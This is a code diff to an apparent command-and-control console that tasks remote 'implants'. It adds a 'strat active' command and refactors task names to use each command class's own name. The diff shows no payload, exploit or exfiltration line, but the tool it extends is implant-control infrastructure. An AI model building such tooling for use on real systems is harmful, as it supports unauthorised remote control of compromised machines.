@@ -91,7 +91,7 @@ async def task_tree(command, args, implant_uuid):
         # special command
         case "help":
             # uses this list to pull the docstrings from, and turn into a help menu
-            dataclasses = [Cd, Sleep, StratPost, StratGet, StratList, Ls, Exit]
+            dataclasses = [Cd, Sleep, StratPost, StratGet, StratList, StratActive, Exit]
             descriptions: list = get_description_of_dataclasses(dataclasses)
 
             # add in barriers:
@@ -180,6 +180,14 @@ async def task_tree(command, args, implant_uuid):
                     return (ResultType.TASK, task)
                 except ParseError as e:
                     return (ResultType.ERROR, str(e))
+
+            elif args.startswith("active"):
+                try:
+                    task = StratActive(implant_uuid=implant_uuid).to_task()
+                    return (ResultType.TASK, task)
+                except ParseError as e:
+                    return (ResultType.ERROR, str(e))
+
             else:
                 return (
                     ResultType.ERROR,
@@ -247,7 +255,7 @@ def create_and_verify_task(implant_uuid: str, task: TaskDetail):
 #         """Convert the dataclass to a task style dictionary structure."""
 
 #         task_args = {"cli": self.cli}
-#         task_detail = TaskDetail(task_name="cmd", args=task_args)
+#         task_detail = TaskDetail(task_name=self.command_name, args=task_args)
 
 #         final_task = create_and_verify_task(
 #             implant_uuid=self.implant_uuid, task=task_detail
@@ -277,7 +285,7 @@ class Cd:
         """Convert the dataclass to a task style dictionary structure."""
 
         task_args = {"directory": self.directory}
-        task_detail = TaskDetail(task_name="cd", args=task_args)
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
 
         final_task = create_and_verify_task(
             implant_uuid=self.implant_uuid, task=task_detail
@@ -306,7 +314,7 @@ class Sleep:
         """Convert the dataclass to a task style dictionary structure."""
 
         task_args = {"sleep_time": int(self.sleep_time)}
-        task_detail = TaskDetail(task_name="sleep", args=task_args)
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
 
         final_task = create_and_verify_task(
             implant_uuid=self.implant_uuid, task=task_detail
@@ -335,7 +343,7 @@ class StratPost:
         """Convert the dataclass to a task style dictionary structure."""
 
         task_args = {"strategy_name": self.strategy_name}
-        task_detail = TaskDetail(task_name="strat post", args=task_args)
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
 
         final_task = create_and_verify_task(
             implant_uuid=self.implant_uuid, task=task_detail
@@ -363,7 +371,7 @@ class StratGet:
         """Convert the dataclass to a task style dictionary structure."""
 
         task_args = {"strategy_name": self.strategy_name}
-        task_detail = TaskDetail(task_name="strat get", args=task_args)
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
 
         final_task = create_and_verify_task(
             implant_uuid=self.implant_uuid, task=task_detail
@@ -392,7 +400,29 @@ class StratList:
         """Convert the dataclass to a task style dictionary structure."""
 
         task_args = {}
-        task_detail = TaskDetail(task_name="strat list", args=task_args)
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
+
+        final_task = create_and_verify_task(
+            implant_uuid=self.implant_uuid, task=task_detail
+        )
+        return final_task
+
+
+@dataclass
+class StratActive:
+    R"""
+    List the active strategy for the implant.
+    """
+
+    command_name = "strat active"
+
+    implant_uuid: str
+
+    def to_task(self) -> dict:
+        """Convert the dataclass to a task style dictionary structure."""
+
+        task_args = {}
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
 
         final_task = create_and_verify_task(
             implant_uuid=self.implant_uuid, task=task_detail
@@ -414,7 +444,7 @@ class Exit:
         """Convert the dataclass to a task style dictionary structure."""
 
         task_args = {}
-        task_detail = TaskDetail(task_name="exit", args=task_args)
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
 
         final_task = create_and_verify_task(
             implant_uuid=self.implant_uuid, task=task_detail
@@ -446,7 +476,7 @@ class Ls:
         """Convert the dataclass to a task style dictionary structure."""
 
         task_args = {"directory": self.directory}
-        task_detail = TaskDetail(task_name="ls", args=task_args)
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
 
         final_task = create_and_verify_task(
             implant_uuid=self.implant_uuid, task=task_detail
